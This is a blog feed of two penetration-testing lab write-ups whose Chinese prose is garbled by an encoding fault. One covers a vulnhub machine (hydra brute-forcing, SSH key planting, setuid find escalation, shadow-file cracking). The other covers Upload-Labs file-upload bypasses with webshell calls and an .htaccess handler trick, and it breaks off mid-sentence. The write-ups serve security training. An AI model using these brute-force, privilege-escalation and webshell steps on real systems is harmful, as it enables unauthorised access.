        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset:solstice é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="sunset-nightfall"><a href="#sunset-nightfall" class="headerlink" title="sunset:nightfall"></a>sunset:nightfall</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li>  é¶æœºï¼š<code>172.16.224.7</code></li><li>  æ”»å‡»æœºï¼š <code>172.16.224.2</code></li></ul><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100609327.png" alt="image-20201202100609327"></p><p>ç›®æ ‡å¼€æ”¾ <strong>21, 22, 80, 3306</strong>ç«¯å£</p><p>ä¸‹é¢çš„smbæ‰«æç»“æœï¼Œçœ‹åˆ°ç›®æ ‡é¶æœºå¯ä»¥ä½¿ç”¨<code>guest</code>ç”¨æˆ·ç™»é™†</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100700298.png" alt="image-20201202100700298"></p><h2 id="smb-login"><a href="#smb-login" class="headerlink" title="smb login"></a>smb login</h2><p>ä½¿ç”¨<code>smbclient -L 172.16.224.7 -U guest%</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100756052.png" alt="image-20201202100756052"></p><p>éå†å…¶ä¸­æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ç”¨çš„ä¸œè¥¿</p><h2 id="ftp-enum"><a href="#ftp-enum" class="headerlink" title="ftp enum"></a>ftp enum</h2><p>ç›®æ ‡è½¬æ¢ä¸ºçˆ†ç ´<code>ftp/ssh</code>ï¼Œä½†æ˜¯çˆ†ç ´å¿…é¡»è¦æœ‰å¯†ç ï¼Œ<code>root</code>ç”¨æˆ·çš„å¯†ç è‚¯å®šçˆ†ç ´ä¸äº†</p><p>ç”¨<code>enum4linux</code>å·¥å…·è·å¾—ç”¨æˆ·å</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202100949238.png" alt="image-20201202100949238"></p><p>æŠŠè¿™ä¸¤ä¸ªç”¨æˆ·å†™å…¥åˆ°<code>user.txt</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101026630.png" alt="image-20201202101026630"></p><p>ä½¿ç”¨<code>hydra</code>çˆ†ç ´ç›®æ ‡ç”¨æˆ·çš„å¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101056208.png" alt="image-20201202101056208"></p><p><code>hydra -L user.txt -P /usr/share/wordlist/rockyou.txt -I -v ftp(/ssh)://172.16.224.7</code></p><p>ç»“æœçˆ†ç ´å‡ºftpçš„å¯†ç <strong>ä¸º<code>cheese</code></strong></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101135455.png" alt="image-20201202101135455"></p><p>å°è¯•ç›´æ¥ç”¨è¿™ä¸ªå¯†ç sshç™»é™†ï¼Œå¯æƒœå¤±è´¥äº†</p><p>åªèƒ½ç™»é™†ftp</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101333781.png" alt="image-20201202101333781"></p><p>è¿™ä¸ªè·¯å¾„æ˜¾ç„¶æ˜¯<code>~/</code>ï¼Œå¯ä»¥æŠŠè‡ªå·±çš„sshå¯†é’¥å†™å…¥<code>.ssh/authorized_keys</code>ï¼Œè¾¾åˆ°å…å¯†ç™»é™†çš„æ•ˆæœã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…å¯†ç™»é™†sshä¹‹åï¼Œæƒé™åªæ˜¯ä¸€ä¸ª<code>matt</code>ï¼Œç›®æ ‡è‚¯å®šæ˜¯å¾—åˆ°rootæƒé™ï¼Œæ‰€ä»¥è‚¯å®šè¦å»ææƒ</p><p>å¯»æ‰¾ä¸€ä¸‹å…å¯†è¿è¡Œçš„ç¨‹åºå’Œæœ‰<code>setuid</code>æƒé™çš„ç¨‹åº</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101730129.png" alt="image-20201202101730129"></p><p>æ‰¾åˆ°ä¸€ä¸ª<code>find</code>ï¼Œçœ‹ä¸€ä¸‹<code>help</code>ï¼ˆskr</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101806880.png" alt="image-20201202101806880"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªç½‘ç«™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101836182.png" alt="image-20201202101836182"></p><p>å¯¹äºæœ‰<code>setuid</code>æƒé™çš„<code>find</code>ç¨‹åºï¼Œä½¿ç”¨<code>find . -exec /bin/bash -p \; -quit</code>å¯ä»¥ææƒ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202101947347.png" alt="image-20201202101947347"></p><p>è¦æ³¨æ„çš„æ˜¯é»˜è®¤çš„<code>find</code>ä¸æ˜¯<code>/script/find</code>ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™éœ€è¦ä½¿ç”¨ç»å¯¹è·¯å¾„</p><p>åˆ‡æ¢åˆ°<code>nightfall</code>ç”¨æˆ·ä¹‹åï¼Œå†™å…¥ä»–çš„<code>~/.ssh/authorized_keys</code>ä¸­ï¼Œå…å¯†ç™»é™†</p><p>é¡ºä¾¿ç»§ç»­çœ‹çœ‹èƒ½å¤Ÿå…å¯†è¿è¡Œçš„ç¨‹åºã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102126776.png" alt="image-20201202102126776"></p><p>å‘ç°<code>/usr/bin/cat</code>æ˜¯å¯ä»¥ä½¿ç”¨<code>root</code>æƒé™å…å¯†è¿è¡Œçš„ï¼Œç”±äº<code>cat</code>å‘½ä»¤åªèƒ½å¤Ÿè¯»æ–‡ä»¶ï¼Œå¹¶ä¸èƒ½å†™å…¥æ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡è¿™ä¸ªç›´æ¥ææƒ</p><p>ä½†æ˜¯è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œåœ¨<code>/etc/shadow</code>ä¸­å­˜æ”¾äº†å„ä¸ªç”¨æˆ·çš„å¯†ç çš„hashå€¼ï¼Œå¦‚æœèƒ½å¤Ÿçˆ†ç ´å‡ºå¯†ç çš„è¯ï¼Œä¹Ÿå°±èµ·åˆ°äº†ç›¸å…³çš„ä½œç”¨</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102426797.png" alt="image-20201202102426797"></p><p>å†™å…¥åˆ°<code>hash.txt</code>ï¼Œä½¿ç”¨<code>john</code>å·¥å…·çˆ†ç ´</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102513857.png" alt="image-20201202102513857"></p><p>å¾—åˆ°äº†rootçš„å¯†ç ä¸º<code>miguel2</code></p><p>ç™»å½•<code>root</code>è´¦æˆ·ï¼Œå¾—åˆ°flag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102608133.png" alt="image-20201202102608133"></p><p>å­—ç¬¦ç”»å¤ªå¤§äº†ï¼Œæˆªå›¾ä¸å¤ªè¡Œï¼ˆ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202102645471.png" alt="image-20201202102645471"></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs</title>
      <link href="/Upload-Labs.html"/>
      <url>/Upload-Labs.html</url>
      
        <content type="html"><![CDATA[<p><code>Upload-labs</code>çš„è®°å½•</p><a id="more"></a><h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ä½¿ç”¨dockerç›´æ¥æ­å»ºç¯å¢ƒ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141102104.png" alt="image-20201130141102104"></p><p>å¯åŠ¨dockerä¹‹åï¼Œéœ€è¦åœ¨<code>/var/www/html</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>upload</code>æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”å°†æ‰€æœ‰æƒç»™<code>www-data</code></p><h2 id="pass01"><a href="#pass01" class="headerlink" title="pass01"></a>pass01</h2><h3 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªä½¿ç”¨äº†å‰ç«¯æ£€æµ‹ï¼Œåç«¯æ²¡æœ‰è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡<strong>æŠ“åŒ…/ä¿®æ”¹jsä»£ç </strong>ç­‰æ–¹æ³•ç»•è¿‡</p><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>å†™ä¸€ä¸ª<code>1.jpg</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141827866.png" alt="image-20201130141827866"></p><p>ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç§°ä¸º<code>1.php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141935932.png" alt="image-20201130141935932"></p><p>è®¿é—®<code>http://ip:port/upload/1.php?c=id</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142347530.png" alt="image-20201130142347530"></p><h2 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h2><h3 id="æºä»£ç -1"><a href="#æºä»£ç -1" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†<code>Content-Type</code>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯å›¾ç‰‡ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹<code>Content-Type</code>ç»•è¿‡</p><h3 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ä¿®æ”¹<code>Content-Type</code>ä¸ºç›®æ ‡æ”¯æŒçš„æ ¼å¼ï¼Œè¿™é‡Œä¿®æ”¹ä¸º<code>image/jpeg</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142739528.png" alt="image-20201130142739528"></p><p>è®¿é—®<code>http://ip:port/upload/2.php?c=whoami</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142909834.png" alt="image-20201130142909834"></p><h2 id="pass03"><a href="#pass03" class="headerlink" title="pass03"></a>pass03</h2><h3 id="æºä»£ç -2"><a href="#æºä»£ç -2" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†åç¼€å<code>.asp .aspx .php .jsp </code>åç¼€çš„æ–‡ä»¶ä¸èƒ½ä¸Šä¼ </p><p>ç”±äºæ–‡ä»¶åé‡‡ç”¨äº†<code>time+random</code>å½¢å¼ä½¿ç”¨<code>.htaccess .php.ini .user.ini</code>è¿™äº›ç»•è¿‡</p><p>æ‰€ä»¥ä½¿ç”¨<code>php3 php4 php5</code>ç­‰åç¼€åç»•è¿‡ï¼Œä½†æ˜¯éœ€è¦åœ¨<code>/etc/apache2/apache2.conf</code>é‡Œé¢åŒ…å«<code>php5.conf</code>æ–‡ä»¶ï¼Œæœ¬ç¯å¢ƒæ²¡æœ‰åŒ…å«ï¼Œä»…ä½œä¸ºå‚è€ƒ</p><p>å¦‚æœç›®æ ‡æ˜¯<code>Windows</code>ç³»ç»Ÿï¼Œè¿˜å¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ã€‚</p><h3 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ä¿®æ”¹æ–‡ä»¶åç¼€åä¸º<code>php5</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144348250.png" alt="image-20201130144348250"></p><p>è®¿é—®æ–‡ä»¶ï¼Œç”±äºæ²¡æœ‰åœ¨<code>apache2</code>ä¸­é…ç½®ï¼Œæ‰€ä»¥æ— æ³•è¢«è§£æã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144451391.png" alt="image-20201130144451391"></p><h2 id="pass04"><a href="#pass04" class="headerlink" title="pass04"></a>pass04</h2><h3 id="æºä»£ç -3"><a href="#æºä»£ç -3" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤šåç¼€åï¼Œä½†æ˜¯æ²¡æœ‰æŠŠä¸Šä¼ çš„æ–‡ä»¶é‡å‘½åï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨<code>.htaccess .php.ini .user.ini</code>ç»•è¿‡</p><p>ä»”ç»†çœ‹ï¼Œä¼šå‘ç°<code>array</code>é‡Œé¢çš„åç¼€åæœ‰äº›å†™é”™äº†ï¼Œä¾‹å¦‚<code>php1 ==&gt; .php1</code></p><h3 id="ç»•è¿‡-3"><a href="#ç»•è¿‡-3" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ä¸Šä¼ <code>.htaccess</code>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">xxx</span>&quot;&gt;</span>  </span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ 